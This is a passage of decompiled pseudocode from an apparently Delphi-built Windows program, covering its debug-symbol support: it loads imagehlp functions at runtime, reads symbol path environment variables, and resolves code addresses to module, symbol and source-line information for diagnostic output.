    v3 = (const CHAR *)sub_4074F8((int)"SymGetOptions");
    dword_466B8C = (int)GetProcAddress_1(hLibModule, v3);
    v4 = (const CHAR *)sub_4074F8((int)"SymSetOptions");
    dword_466B90 = (int)GetProcAddress_1(hLibModule, v4);
    v5 = (const CHAR *)sub_4074F8((int)"SymCleanup");
    dword_466B94 = (int (__stdcall *)(_DWORD))GetProcAddress_1(hLibModule, v5);
    v6 = (const CHAR *)sub_4074F8((int)"SymGetSymFromAddr");
    dword_466B98 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress_1(hLibModule, v6);
    v7 = (const CHAR *)sub_4074F8((int)"SymGetSymFromAddrW");
    dword_466B9C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress_1(hLibModule, v7);
    v8 = (const CHAR *)sub_4074F8((int)"SymGetModuleInfo");
    dword_466BA0 = (int)GetProcAddress_1(hLibModule, v8);
    v9 = (const CHAR *)sub_4074F8((int)"SymGetModuleInfoW");
    dword_466BA4 = (int)GetProcAddress_1(hLibModule, v9);
    v10 = (const CHAR *)sub_4074F8((int)"SymLoadModule");
    dword_466BA8 = (int)GetProcAddress_1(hLibModule, v10);
    v11 = (const CHAR *)sub_4074F8((int)"SymGetLineFromAddr");
    dword_466BAC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress_1(hLibModule, v11);
    v12 = (const CHAR *)sub_4074F8((int)"SymGetLineFromAddrW");
    dword_466BB0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress_1(hLibModule, v12);
    if ( dword_466B8C
      && dword_466B90
      && dword_466B94
      && dword_466BA8
      && (dword_466B84 || dword_466B88)
      && (dword_466B98 || dword_466B9C)
      && (dword_466BA0 || dword_466BA4) )
    {
      LOBYTE(v0) = 1;
    }
    else
    {
      return 0;
    }
  }
  return v0;
}
// 42E570: using guessed type wchar_t aImagehlpDll[13];
// 466B84: using guessed type int dword_466B84;
// 466B88: using guessed type int dword_466B88;
// 466B8C: using guessed type int dword_466B8C;
// 466B90: using guessed type int dword_466B90;
// 466B94: using guessed type int (__stdcall *dword_466B94)(_DWORD);
// 466B98: using guessed type int (__stdcall *dword_466B98)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 466B9C: using guessed type int (__stdcall *dword_466B9C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 466BA0: using guessed type int dword_466BA0;
// 466BA4: using guessed type int dword_466BA4;
// 466BA8: using guessed type int dword_466BA8;
// 466BAC: using guessed type int (__stdcall *dword_466BAC)(_DWORD, _DWORD, _DWORD, _DWORD);
// 466BB0: using guessed type int (__stdcall *dword_466BB0)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0042E6F0) --------------------------------------------------------
int __usercall sub_42E6F0@<eax>(int a1@<ebx>)
{
  LOBYTE(a1) = hLibModule != 0;
  if ( hLibModule )
    FreeLibrary_1(hLibModule);
  hLibModule = 0;
  dword_466B84 = 0;
  dword_466B88 = 0;
  dword_466B8C = 0;
  dword_466B90 = 0;
  dword_466B94 = 0;
  dword_466B98 = 0;
  dword_466B9C = 0;
  dword_466BA0 = 0;
  dword_466BA4 = 0;
  dword_466BA8 = 0;
  dword_466BAC = 0;
  dword_466BB0 = 0;
  return a1;
}
// 466B84: using guessed type int dword_466B84;
// 466B88: using guessed type int dword_466B88;
// 466B8C: using guessed type int dword_466B8C;
// 466B90: using guessed type int dword_466B90;
// 466B94: using guessed type int dword_466B94;
// 466B98: using guessed type int dword_466B98;
// 466B9C: using guessed type int dword_466B9C;
// 466BA0: using guessed type int dword_466BA0;
// 466BA4: using guessed type int dword_466BA4;
// 466BA8: using guessed type int dword_466BA8;
// 466BAC: using guessed type int dword_466BAC;
// 466BB0: using guessed type int dword_466BB0;

//----- (0042E780) --------------------------------------------------------
volatile __int32 *__usercall sub_42E780@<eax>(volatile __int32 *result@<eax>, int a2)
{
  int v2; // esi
  int v3; // eax
  int v4; // ebx
  int v5; // [esp+8h] [ebp-4h]

  v2 = (int)result;
  if ( result )
  {
    v5 = *(_DWORD *)(a2 - 4);
    v3 = v5;
    if ( v5 )
      v3 = *(_DWORD *)(v5 - 4);
    v4 = v3;
    System::__linkproc__ DynArraySetLength(v3 + 1);
    return sub_406FE8((volatile __int32 *)(*(_DWORD *)(a2 - 4) + 4 * v4), v2);
  }
  return result;
}
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);

//----- (0042E7E0) --------------------------------------------------------
int __fastcall sub_42E7E0(int a1, volatile __int32 *a2)
{
  int v3; // ebx
  int v4; // edi
  char v5; // zf
  int v6; // eax
  unsigned int v8[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v9; // [esp-4h] [ebp-18h]
  int v10; // [esp+Ch] [ebp-8h] BYREF
  volatile __int32 *v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v10 = 0;
  v11 = a2;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_42E862;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v3 = 0;
  v4 = a1;
  if ( a1 )
    v4 = *(_DWORD *)(a1 - 4);
  sub_407AD8(*v11, 1, v4, &v10);
  sub_407AA0(v10, a1);
  if ( v5 )
  {
    v6 = a1;
    if ( a1 )
      v6 = *(_DWORD *)(a1 - 4);
    sub_407B20(v11, 1, v6);
    LOBYTE(v3) = 1;
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_42E869;
  sub_406C44(&v10);
  return v3;
}
// 42E82D: variable 'v5' is possibly undefined

//----- (0042E880) --------------------------------------------------------
int sub_42E880()
{
  int v0; // ebx
  HANDLE CurrentProcess; // ebx
  int v2; // eax
  int v3; // eax
  int v4; // eax
  unsigned int v6[2]; // [esp-24h] [ebp-4Ch] BYREF
  int *v7; // [esp-1Ch] [ebp-44h]
  unsigned int v8[2]; // [esp-18h] [ebp-40h] BYREF
  int *v9; // [esp-10h] [ebp-38h]
  unsigned int v10[2]; // [esp-Ch] [ebp-34h] BYREF
  int *v11; // [esp-4h] [ebp-2Ch]
  volatile __int32 *v12; // [esp+4h] [ebp-24h] BYREF
  int v13; // [esp+8h] [ebp-20h]
  Idthreadcomponent::TIdThreadComponent *v14; // [esp+Ch] [ebp-1Ch]
  int System__AnsiString; // [esp+10h] [ebp-18h]
  __int32 v16; // [esp+14h] [ebp-14h] BYREF
  CHAR *v17; // [esp+18h] [ebp-10h] BYREF
  volatile __int32 *v18; // [esp+1Ch] [ebp-Ch] BYREF
  const WCHAR *v19; // [esp+20h] [ebp-8h] BYREF
  int v20; // [esp+24h] [ebp-4h] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_42EADF;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v0 = (unsigned __int8)byte_466BB4;
  if ( !byte_466BB5 )
  {
    v0 = sub_42E3B0();
    byte_466BB5 = v0 ^ 1;
    if ( (_BYTE)v0 )
    {
      sub_408B34(&v20, (int)&byte_4224D0);
      sub_4273F0((int *)&v12);
      sub_42E780(v12, (int)&savedregs);
      v14 = (Idthreadcomponent::TIdThreadComponent *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
      v9 = &savedregs;
      v8[1] = (unsigned int)&loc_42E9F4;
      v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v8);
      if ( (unsigned __int8)sub_425BB0(v14) && *((_DWORD *)v14 + 2) - 1 >= 0 )
      {
        v13 = *((_DWORD *)v14 + 2);
        System__AnsiString = 0;
        do
        {
          v7 = &savedregs;
          v6[1] = (unsigned int)&loc_42E993;
          v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)v6);
          sub_406C44(&v16);
          if ( *((_DWORD *)v14 + 2) <= (unsigned int)System__AnsiString )
            Idthreadcomponent::TIdThreadComponent::SetThreadName(v14, System__AnsiString);
          sub_407030(&v16, *(_DWORD *)(*((_DWORD *)v14 + 1) + 8 * System__AnsiString));
          sub_407030((volatile __int32 *)&v18, v16);
          __writefsdword(0, v6[0]);
          v7 = (int *)&loc_42E99A;
          sub_406C44(&v16);
          if ( (unsigned __int8)sub_42E7E0((int)L"_NT_SYMBOL_PATH=", (volatile __int32 *)&v18)
            || (unsigned __int8)sub_42E7E0((int)L"_NT_ALTERNATE_SYMBOL_PATH=", (volatile __int32 *)&v18) )
          {
            sub_42E780(v18, (int)&savedregs);
          }
          ++System__AnsiString;
          --v13;
        }
        while ( v13 );
      }
      __writefsdword(0, v8[0]);
      v9 = (int *)&loc_42E9FB;
      sub_405598(v14);
      sub_424820(v20, (int)&str___2[1], (volatile __int32 *)&v19);
      CurrentProcess = GetCurrentProcess();
      if ( dword_466B88 )
      {
        v9 = 0;
        v2 = sub_407790((int)v19);
        v0 = dword_466B88(CurrentProcess, v2, v9) != 0;
      }
      else if ( dword_466B84 )
      {
        sub_407634(&v17, v19, 0, v10[0]);
        v10[0] = 0;
        v3 = sub_4074F8((int)v17);
        v0 = dword_466B84(CurrentProcess, v3) != 0;
      }
      else
      {
        v0 = 0;
      }
      if ( (_BYTE)v0 )
      {
        v4 = dword_466B8C();
        dword_466B90(v4 & 0xFFFFDCED | 0x2210);
      }
      byte_466BB4 = v0;
    }
    else
    {
      sub_42E6F0(v0);
    }
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_42EAE6;
  sub_406C44(&v12);
  sub_406C44(&v16);
  sub_406C68(&v17);
  sub_406CA4((int)&v18, 2);
  sub_408B34(&v20, (int)&byte_4224D0);
  return v0;
}
// 466B88: invalid function type has been ignored
// 466B84: invalid function type has been ignored
// 466B8C: invalid function type has been ignored
// 466B90: invalid function type has been ignored
// 4224D0: using guessed type char byte_4224D0;
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 42EAFC: using guessed type wchar_t aNtSymbolPath[17];
// 42EB2C: using guessed type wchar_t aNtAlternateSym[27];
// 42EB68: using guessed type _strings str___2[1];
// 466B84: using guessed type int (__stdcall *dword_466B84)(_DWORD, _DWORD);
// 466B88: using guessed type int (__stdcall *dword_466B88)(_DWORD, _DWORD, _DWORD);
// 466B8C: using guessed type int (*dword_466B8C)(void);
// 466B90: using guessed type int (__stdcall *dword_466B90)(_DWORD);
// 466BB4: using guessed type char byte_466BB4;
// 466BB5: using guessed type char byte_466BB5;

//----- (0042EB80) --------------------------------------------------------
int __usercall sub_42EB80@<eax>(int a1@<ebx>)
{
  HANDLE CurrentProcess; // eax

  LOBYTE(a1) = 1;
  if ( byte_466BB4 )
  {
    CurrentProcess = GetCurrentProcess();
    a1 = dword_466B94(CurrentProcess) != 0;
  }
  sub_42E6F0(a1);
  return a1;
}
// 466B94: invalid function type has been ignored
// 466B94: using guessed type int (__stdcall *dword_466B94)(_DWORD);
// 466BB4: using guessed type char byte_466BB4;

//----- (0042EBB0) --------------------------------------------------------
BOOL __fastcall sub_42EBB0(int a1, int a2, _DWORD *a3, _DWORD *a4)
{
  BOOL result; // eax
  int v6[279]; // [esp+8h] [ebp-6A0h] BYREF
  int v7[143]; // [esp+464h] [ebp-244h] BYREF
  int v8; // [esp+6A0h] [ebp-8h]
  int v9; // [esp+6A4h] [ebp-4h]

  v8 = a2;
  v9 = a1;
  result = 0;
  *a3 = 0;
  *a4 = 0;
  if ( dword_466BA4 )
  {
    sub_4051B8(v6, 1116, 0);
    v6[0] = 1116;
    result = dword_466BA4(v9, v8, v6) != 0;
    if ( result )
    {
      *a3 = v6[1];
      *a4 = v6[6];
    }
  }
  else if ( dword_466BA0 )
  {
    sub_4051B8(v7, 572, 0);
    v7[0] = 572;
    result = dword_466BA0(v9, v8, v7) != 0;
    if ( result )
    {
      *a3 = v7[1];
      *a4 = v7[6];
    }
  }
  return result;
}
// 466BA4: invalid function type has been ignored
// 466BA0: invalid function type has been ignored
// 466BA0: using guessed type int (__stdcall *dword_466BA0)(_DWORD, _DWORD, _DWORD);
// 466BA4: using guessed type int (__stdcall *dword_466BA4)(_DWORD, _DWORD, _DWORD);

//----- (0042EC90) --------------------------------------------------------
BOOL __fastcall sub_42EC90(int a1, int a2, _DWORD *a3, _DWORD *a4)
{
  int v7; // eax
  int v8; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v11; // [esp-8h] [ebp-28h]
  int *v12; // [esp-4h] [ebp-24h]
  void *v13; // [esp+0h] [ebp-20h]
  int v14; // [esp+Ch] [ebp-14h]
  int v15; // [esp+10h] [ebp-10h]
  _WORD *Mem; // [esp+14h] [ebp-Ch]
  _WORD *v17; // [esp+18h] [ebp-8h]
  bool v18; // [esp+1Fh] [ebp-1h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  if ( a4 )
    *a4 = 0;
  v18 = 0;
  *a3 = 0;
  sub_406C44(a4);
  if ( dword_466B9C )
  {
    Mem = (_WORD *)System::__linkproc__ GetMem(2022);
    v12 = &savedregs;
    v11 = &loc_42ED4A;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_4051B8(Mem, 2022, 0);
    *(_DWORD *)Mem = 22;
    *((_DWORD *)Mem + 4) = 1000;
    v15 = a2;
    v7 = dword_466B9C(a1, a2, a3, Mem, ExceptionList);
    v18 = v7 != 0;
    if ( v7 )
      unknown_libname_50(a4, Mem + 10);
    __writefsdword(0, (unsigned int)v11);
    v13 = &loc_42EDE8;
    System::__linkproc__ FreeMem(Mem);
  }
  else if ( dword_466B98 )
  {
    v17 = (_WORD *)System::__linkproc__ GetMem(1021);
    v12 = &savedregs;
    v11 = &loc_42EDE1;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_4051B8(v17, 1021, 0);
    *(_DWORD *)v17 = 21;
    *((_DWORD *)v17 + 4) = 1000;
    v14 = a2;
    v8 = dword_466B98(a1, a2, a3, v17, ExceptionList);
    v18 = v8 != 0;
    if ( v8 )
      unknown_libname_49(a4, v17 + 10);
    __writefsdword(0, (unsigned int)v11);
    v13 = &loc_42EDE8;
    System::__linkproc__ FreeMem(v17);
  }
  return v18;
}
// 466B9C: invalid function type has been ignored
// 466B98: invalid function type has been ignored
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 4077B8: using guessed type int __fastcall unknown_libname_49(_DWORD, _DWORD);
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 466B98: using guessed type int (__stdcall *dword_466B98)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 466B9C: using guessed type int (__stdcall *dword_466B9C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0042EE00) --------------------------------------------------------
BOOL __fastcall sub_42EE00(int a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5)
{
  BOOL v6; // ebx
  int v7; // eax
  int v8; // eax
  int v10[5]; // [esp+Ch] [ebp-38h] BYREF
  int v11[7]; // [esp+20h] [ebp-24h] BYREF
  int v12; // [esp+3Ch] [ebp-8h]
  int v13; // [esp+40h] [ebp-4h]

  v12 = a2;
  v13 = a1;
  if ( a3 )
    *a3 = 0;
  v6 = 0;
  sub_406C44(a3);
  *a4 = 0;
  *a5 = 0;
  if ( dword_466BB0 )
  {
    sub_4051B8(v10, 20, 0);
    v10[0] = 20;
    v11[6] = v12;
    v7 = dword_466BB0(v13, v12, a5, v10);
    v6 = v7 != 0;
    if ( v7 )
    {
      *a4 = v10[2];
      unknown_libname_50(a3, v10[3]);
    }
  }
  else if ( dword_466BAC )
  {
    sub_4051B8(v11, 20, 0);
    v11[0] = 20;
    v11[5] = v12;
    v8 = dword_466BAC(v13, v12, a5, v11);
    v6 = v8 != 0;
    if ( v8 )
    {
      *a4 = v11[2];
      unknown_libname_49(a3, v11[3]);
    }
  }
  return v6;
}
// 466BB0: invalid function type has been ignored
// 466BAC: invalid function type has been ignored
// 4077B8: using guessed type int __fastcall unknown_libname_49(_DWORD, _DWORD);
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 466BAC: using guessed type int (__stdcall *dword_466BAC)(_DWORD, _DWORD, _DWORD, _DWORD);
// 466BB0: using guessed type int (__stdcall *dword_466BB0)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0042EF60) --------------------------------------------------------
int __usercall sub_42EF60@<eax>(int a1@<ebx>)
{
  int result; // eax

  if ( !++dword_46ED98 )
    return sub_42EB80(a1);
  return result;
}
// 46ED98: using guessed type int dword_46ED98;

//----- (0042F2A0) --------------------------------------------------------
void sub_42F2A0()
{
  if ( !dword_466BB8 )
    dword_466BB8 = sub_42B770((int)&cls_DebugLocationInfoUtil_TDebugInfoList, 1, 1);
}
// 42F0D0: using guessed type __int16 cls_DebugLocationInfoUtil_TDebugInfoList;

//----- (0042F2D0) --------------------------------------------------------
int __fastcall sub_42F2D0(LPCVOID lpAddress, int a2)
{
  int v3; // ecx
  _WORD *v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-8h] [ebp-1Ch] BYREF
  int *v8; // [esp-4h] [ebp-18h]
  int *v9; // [esp+0h] [ebp-14h]
  int v10; // [esp+4h] [ebp-10h]
  int v11; // [esp+8h] [ebp-Ch]
  unsigned __int8 v12; // [esp+Fh] [ebp-5h]
  int v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v13 = a2;
  sub_407D10(a2, (int)&byte_42EF78);
  v8 = &savedregs;
  v7 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_42F35E;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (**(void (__fastcall ***)(int, _DWORD, int, void *, struct _EXCEPTION_REGISTRATION_RECORD *))dword_466BBC)(
    dword_466BBC,
    *(_DWORD *)dword_466BBC,
    v3,
    &loc_42F35E,
    ExceptionList);
  v9 = &savedregs;
  v8 = (int *)&loc_42F34D;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v7);
  sub_42F2A0();
  v4 = (_WORD *)sub_407DEC(v13, (int)&byte_42EF78);
  v12 = sub_42F9A0(dword_466BB8, lpAddress, v4);
  __writefsdword(0, (unsigned int)v7);
  (*(void (__fastcall **)(int, _DWORD, int *, int, int, void *))(*(_DWORD *)dword_466BBC + 4))(
    dword_466BBC,
    *(_DWORD *)dword_466BBC,
    v9,
    v11,
    v10,
    &loc_42F354);
  __writefsdword(0, (unsigned int)ExceptionList);
  return v12;
}
// 42F301: variable 'v3' is possibly undefined
// 42EF78: using guessed type char byte_42EF78;
// 466BBC: using guessed type int dword_466BBC;

//----- (0042F380) --------------------------------------------------------
int __fastcall sub_42F380(LPCVOID lpAddress, int a2, int a3)
{
  _WORD *v4; // eax
  int result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-8h] [ebp-18h] BYREF
  int *v8; // [esp-4h] [ebp-14h]
  int *v9; // [esp+0h] [ebp-10h]
  int v10; // [esp+4h] [ebp-Ch]
  int v11; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v11 = a2;
  v8 = &savedregs;
  v7 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_42F3FB;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (**(void (__fastcall ***)(int, _DWORD, int, void *, struct _EXCEPTION_REGISTRATION_RECORD *))dword_466BBC)(
    dword_466BBC,
    *(_DWORD *)dword_466BBC,
    a3,
    &loc_42F3FB,
    ExceptionList);
  v9 = &savedregs;
  v8 = (int *)&loc_42F3EA;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v7);
  sub_42F2A0();
  v4 = (_WORD *)sub_407DEC(v11, (int)&byte_42EF78);
  sub_42F9A0(dword_466BB8, lpAddress, v4);
  __writefsdword(0, (unsigned int)v7);
  (*(void (__fastcall **)(int, _DWORD, int *, int, void *))(*(_DWORD *)dword_466BBC + 4))(
    dword_466BBC,
    *(_DWORD *)dword_466BBC,
    v9,
    v10,
    &loc_42F3F1);
  result = 0;
  __writefsdword(0, (unsigned int)ExceptionList);
  return result;
}
// 42EF78: using guessed type char byte_42EF78;
// 466BBC: using guessed type int dword_466BBC;

//----- (0042F430) --------------------------------------------------------
int __usercall sub_42F430@<eax>(
        int *a1@<eax>,
        unsigned int a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>)
{
  int v8; // eax
  unsigned int v10[2]; // [esp-18h] [ebp-28h] BYREF
  int *v11; // [esp-10h] [ebp-20h]
  int v12; // [esp-Ch] [ebp-1Ch]
  int v13; // [esp-8h] [ebp-18h]
  int v14; // [esp-4h] [ebp-14h]
  __int32 v15; // [esp+0h] [ebp-10h] BYREF
  __int32 v16; // [esp+4h] [ebp-Ch] BYREF
  __int32 v17; // [esp+8h] [ebp-8h] BYREF
  int v18; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = a4;
  v13 = a6;
  v12 = a5;
  v18 = a3;
  sub_407D10(a3, (int)&byte_42EF78);
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_42F4F4;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_42DEA0(a1, a2, &v17);
  sub_406FE8((volatile __int32 *)(v18 + 4), v17);
  LOBYTE(a4) = *(_DWORD *)(v18 + 4) != 0;
  if ( *(_DWORD *)(v18 + 4) )
  {
    sub_42DF40(a1, a2, (_DWORD *)(v18 + 12), &v16);
    sub_406FE8((volatile __int32 *)(v18 + 8), v16);
    v8 = sub_42DC50((int)a1, a2, (_DWORD *)(v18 + 20));
    *(_DWORD *)(v18 + 16) = v8;
    sub_42E310(a1, a2, &v15);
    sub_406FE8((volatile __int32 *)(v18 + 24), v15);
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_42F4FB;
  sub_406CA4((int)&v15, 3);
  return a4;
}
// 42F430: could not find valid save-restore pair for ebx
// 42F430: could not find valid save-restore pair for edi
// 42F430: could not find valid save-restore pair for esi
// 42EF78: using guessed type char byte_42EF78;

//----- (0042F510) --------------------------------------------------------
int __fastcall sub_42F510(const void *a1, _BYTE *a2, int *a3)
{
  int v6; // eax
  unsigned int v8; // [esp-18h] [ebp-4Ch]
  _DWORD v9[6]; // [esp-Ch] [ebp-40h] BYREF
  unsigned int v10; // [esp+Ch] [ebp-28h] BYREF
  int v11[9]; // [esp+10h] [ebp-24h] BYREF
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v10 = 0;
  sub_407D10((int)v11, (int)&byte_42EF78);
  v9[2] = &savedregs;
  v9[1] = &loc_42F5B2;
  v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v6 = sub_407DEC((int)v11, (int)&byte_42EF78);
  if ( (unsigned __int8)sub_42F2D0(a1, v6) )
  {
    sub_42FE10(v11, (*a2 & 4) != 0, (*a2 & 8) != 0, (int *)&v10);
    v8 = v10;
    sub_4079F0(a3, 3);
  }
  else
  {
    *a2 |= 0x10u;
  }
  __writefsdword(0, v8);
  sub_406C44(&v10);
  return sub_407DEC((int)v11, (int)&byte_42EF78);
}
// 42F593: variable 'v8' is possibly undefined
// 42EF78: using guessed type char byte_42EF78;
// 42F5C4: using guessed type _strings str___3[1];
// 42F510: using guessed type int var_24[9];

//----- (0042F5D0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __fastcall sub_42F5D0(const void *a1, char a2, _DWORD *a3)
{
  PVOID v3; // eax
  _BYTE *v4; // eax
  unsigned int v6; // [esp-28h] [ebp-58h]
  int *v7; // [esp-24h] [ebp-54h]
  void *v8; // [esp-20h] [ebp-50h]
  int *v9; // [esp-1Ch] [ebp-4Ch]
  _DWORD v10[3]; // [esp-18h] [ebp-48h] BYREF
  _DWORD v11[4]; // [esp-Ch] [ebp-3Ch] BYREF
  int v12; // [esp+4h] [ebp-2Ch] BYREF
  void *v13; // [esp+8h] [ebp-28h] BYREF
  int v14; // [esp+Ch] [ebp-24h]
  const wchar_t *v15; // [esp+10h] [ebp-20h]
  void *v16; // [esp+14h] [ebp-1Ch]
  int *v17; // [esp+18h] [ebp-18h]
  int ExceptionList; // [esp+1Ch] [ebp-14h] BYREF
  void *v19; // [esp+20h] [ebp-10h] BYREF
  LPCVOID lpAddress; // [esp+24h] [ebp-Ch]
  unsigned int v21; // [esp+28h] [ebp-8h] BYREF
  void *v22; // [esp+2Ch] [ebp-4h] BYREF
  void *savedregs; // [esp+30h] [ebp+0h] BYREF

  v13 = 0;
  v12 = 0;
  v22 = 0;
  v21 = 0;
  ExceptionList = (int)a3;
  HIBYTE(v19) = a2;
  lpAddress = a1;
  v11[2] = &savedregs;
  v11[1] = &loc_42F798;
  v11[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  sub_406C44(a3);
  if ( (HIBYTE(v19) & 1) != 0 )
  {
    v3 = sub_42B260(lpAddress);
    sub_427410((int)v3, &v12);
    sub_4254A0(v12, &v13);
    sub_407968((volatile __int32 *)ExceptionList, dword_42F7B0, v13);
    while ( System::__linkproc__ LStrLen(*(_DWORD *)ExceptionList) < 21 )
      sub_407910((volatile __int32 *)ExceptionList, &str___4[1]._top);
    sub_407910((volatile __int32 *)ExceptionList, dword_42F7D0);
  }
  v10[2] = &savedregs;
  v10[1] = &loc_42F6C7;
  v10[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v17 = (int *)lpAddress;
  sub_4154C8(8, (int *)&v22, (unsigned int)lpAddress);
  v9 = dword_42F7E0;
  v8 = v22;
  v7 = dword_42F7F0;
  v6 = *(_DWORD *)ExceptionList;
  sub_4079F0((int *)ExceptionList, 4);
  __writefsdword(0, v6);
  v8 = &loc_42F6CE;
  sub_406C44(&v22);
  if ( (HIBYTE(v19) & 2) != 0 )
    sub_42F510(lpAddress, (_BYTE *)&v19 + 3, (int *)ExceptionList);
  if ( (HIBYTE(v19) & 0x10) != 0 )
  {
    v4 = sub_42B260(lpAddress);
    lpAddress = &savedregs;
    v19 = &loc_42F766;
    ExceptionList = (int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    v14 = (char *)&savedregs - v4 - 4096;
    sub_4154C8(8, (int *)&v21, (unsigned int)v14);
    v17 = dword_42F800;
    v16 = (void *)v21;
    v15 = L") ";
    v14 = *(_DWORD *)ExceptionList;
    sub_4079F0((int *)ExceptionList, 4);
    __writefsdword(0, v14);
    v16 = &loc_42F76D;
    sub_406C44(&v21);
  }
  __writefsdword(0, v21);
  savedregs = &loc_42F79F;
  sub_406C44(&v12);
  sub_406C44(&v13);
  return sub_406CA4((int)&v21, 2);
}
// 42F6DD: bad sp value at call
// 42F77D: bad sp value at call
// 42F785: bad sp value at call
// 42F792: bad sp value at call
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 42F7B0: using guessed type int dword_42F7B0[2];
// 42F7B8: using guessed type _strings str___4[1];
// 42F7D0: using guessed type int dword_42F7D0[4];
// 42F7E0: using guessed type int dword_42F7E0[4];
// 42F7F0: using guessed type int dword_42F7F0[4];
// 42F800: using guessed type int dword_42F800[4];
// 42F810: using guessed type wchar_t asc_42F810[3];

//----- (0042F850) --------------------------------------------------------
int __fastcall sub_42F850(int a1, int a2)
{
  return a2 - *(_DWORD *)(a1 + 4) - 4096;
}

//----- (0042F870) --------------------------------------------------------
int __fastcall sub_42F870(int a1, int a2)
{
  int v2; // ebx
  unsigned int i; // esi
  int v4; // eax
  int v5; // edx
  _DWORD *v6; // eax
  unsigned int v8[6]; // [esp-Ch] [ebp-20h] BYREF
  _DWORD *v9; // [esp+Ch] [ebp-8h]
  int v10; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v10 = a2;
  sub_42FA10();
  v9 = 0;
  if ( *((_DWORD *)dword_466BC0 + 2) - 1 >= 0 )
  {
    v2 = *((_DWORD *)dword_466BC0 + 2);
    for ( i = 0; ; ++i )
    {
      v4 = sub_428060(dword_466BC0, i);
      LOBYTE(v5) = 1;
      v9 = (_DWORD *)(*(int (__fastcall **)(int, int, int))(v4 + 4))(v4, v5, v10);
      v8[2] = (unsigned int)&savedregs;
      v8[1] = (unsigned int)&loc_42F8EA;
      v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v8);
      if ( (*(unsigned __int8 (__fastcall **)(_DWORD *))(*v9 + 8))(v9) )
        break;
      v6 = v9;
      v9 = 0;
      sub_405598(v6);
      __writefsdword(0, v8[0]);
